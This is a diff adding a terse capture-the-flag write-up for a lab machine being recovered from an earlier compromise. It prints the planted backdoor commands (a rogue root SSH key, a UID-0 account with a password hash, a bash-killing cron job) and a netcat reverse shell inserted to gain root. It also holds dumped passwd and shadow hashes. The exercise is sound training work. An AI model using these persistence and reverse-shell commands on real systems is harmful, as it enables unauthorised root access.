@@ -1,0 +1,216 @@
+
+					recon
+
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.43 ((Unix))
+1337/tcp open  http    nginx 1.14.0 (Ubuntu)
+65499/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+
+
+
+
+
+
+					enum
+
+*lots of noise on 80
+
+
+Username: alex
+Password: madeline
+
+
+
+*the magic word thing is a pain
+
+
+ssh -t alex@10.10.131.111 /bin/sh
+
+$ls 
+
+fixutil
+
+
+
+
+					privesc1
+
+*scp to local machine
+
+
+
+*strings fixutil
+
+*some sus stuff 
+
+
+-------------------------------------------------------------------------------------
+
+XOREncryptWebFiles
+
+
+/usr/local/apache2/htdocs/
+
+
+/opt/.fixutil/backup.txt
+
+
+/bin/mv /tmp/logging.so /lib/x86_64-linux-gnu/oldliblogging.so
+
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4U9gOtekRWtwKBl3+ysB5WfybPSi/rpvDDfvRNZ+BL81mQYTMPbY3bD6u2eYYXfWMK6k3XsILBizVqCqQVNZeyUj5x2FFEZ0R+HmxXQkBi+yNMYoJYgHQyngIezdBsparH62RUTfmUbwGlT0kxqnnZQsJbXnUCspo0zOhl8tK4qr8uy2PAG7QbqzL/epfRPjBn4f3CWV+EwkkkE9XLpJ+SHWPl8JSdiD/gTIMd0P9TD1Ig5w6F0f4yeGxIVIjxrA4MCHMmo1U9vsIkThfLq80tWp9VzwHjaev9jnTFg+bZnTxIoT4+Q2gLV124qdqzw54x9AmYfoOfH9tBwr0+pJNWi1CtGo1YUaHeQsA8fska7fHeS6czjVr6Y76QiWqq44q/BzdQ9klTEkNSs+2sQs9csUybWsXumipViSUla63cLnkfFr3D9nzDbFHek6OEk+ZLyp8YEaghHMfB6IFhu09w5cPZApTngxyzJU7CgwiccZtXURnBmKV72rFO6ISrus= root@recovery
+
+
+/root/.ssh/authorized_keys
+
+
+
+/usr/sbin/useradd --non-unique -u 0 -g 0 security 2>/dev/null
+
+
+/bin/echo 'security:$6$he6jYubzsBX1d7yv$sD49N/rXD5NQT.uoJhF7libv6HLc0/EZOqZjcvbXDoua44ZP3VrUcicSnlmvWwAFTqHflivo5vmYjKR13gZci/' | /usr/sbin/chpasswd -e
+
+
+
+/opt/brilliant_script.sh
+
+#!/bin/sh
+for i in $(ps aux | grep bash | grep -v grep | awk '{print $2}'); do kill $i; done;
+/etc/cron.d/evil
+
+* * * * * root /opt/brilliant_script.sh 2>&1 >/tmp/testlog
+
+
+
+XORFile
+
+GetWebFiles
+
+
+
+/home/alex/.bashrc
+while :; do echo "YOU DIDN'T SAY THE MAGIC WORD!"; done &
+/bin/cp /lib/x86_64-linux-gnu/liblogging.so /tmp/logging.so
+/lib/x86_64-linux-gnu/liblogging.so
+echo pwned | /bin/admin > /dev/null
+
+
+
+-------------------------------------------------------------------------
+
+
+
+*change the /opt/brilliant_script.sh
+*comment out the original command
+*insert nc payload
+
+nc -e /bin/sh 10.0.0.1 1234
+
+*got root
+
+
+
+
+
+
+
+
+
+*remove security acc from /etc/passwd and /etc/shadow
+
+
+
+
+
+*remove ssh keys from root
+authorized_keys
+
+
+
+
+*delete .bashrc for alex and get a new one
+scp .bashrc alex@$IP:/home/alex
+
+
+
+*XOR - web pages in apache htdocs
+*decrypt with cyberchef
+*need a key
+*looks like a key
+
+cat /opt/.fixutil/backup.txt
+AdsipPewFlfkmll
+
+*insert decrypted output into files
+scp htdocs/* alex@$IP:/home/alex/hht-docs/
+mv /home/alex/ht-docs/* /usr/local/apache2/htdocs/
+
+
+
+*move oldlogging.so to /tmp/logging.so
+
+
+
+
+
+
+
+					shits and gigs
+
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
+Debian-exim:x:105:106::/var/spool/exim4:/usr/sbin/nologin
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+alex:x:1000:1000::/home/alex:/bin/bash
+security:x:0:0::/home/security:/bin/sh
+
+
+root:*:18396:0:99999:7:::
+daemon:*:18396:0:99999:7:::
+bin:*:18396:0:99999:7:::
+sys:*:18396:0:99999:7:::
+sync:*:18396:0:99999:7:::
+games:*:18396:0:99999:7:::
+man:*:18396:0:99999:7:::
+lp:*:18396:0:99999:7:::
+mail:*:18396:0:99999:7:::
+news:*:18396:0:99999:7:::
+uucp:*:18396:0:99999:7:::
+proxy:*:18396:0:99999:7:::
+www-data:*:18396:0:99999:7:::
+backup:*:18396:0:99999:7:::
+list:*:18396:0:99999:7:::
+irc:*:18396:0:99999:7:::
+gnats:*:18396:0:99999:7:::
+nobody:*:18396:0:99999:7:::
+_apt:*:18396:0:99999:7:::
+systemd-timesync:*:18421:0:99999:7:::
+systemd-network:*:18421:0:99999:7:::
+systemd-resolve:*:18421:0:99999:7:::
+messagebus:*:18421:0:99999:7:::
+Debian-exim:!:18421:0:99999:7:::
+sshd:*:18421:0:99999:7:::
+alex:$6$vcMl0yk2GfmTUbNd$xuyw4BbFIqKyCSumvytbXc2P2EoQkea04XqdYtongud84By9/UkJVWX4Gnp9faVKSvg4nodureq.gziMFuVOH1:18430:0:99999:7:::
+security:$6$he6jYubzsBX1d7yv$sD49N/rXD5NQT.uoJhF7libv6HLc0/EZOqZjcvbXDoua44ZP3VrUcicSnlmvWwAFTqHflivo5vmYjKR13gZci/:18430:0:99999:7:::
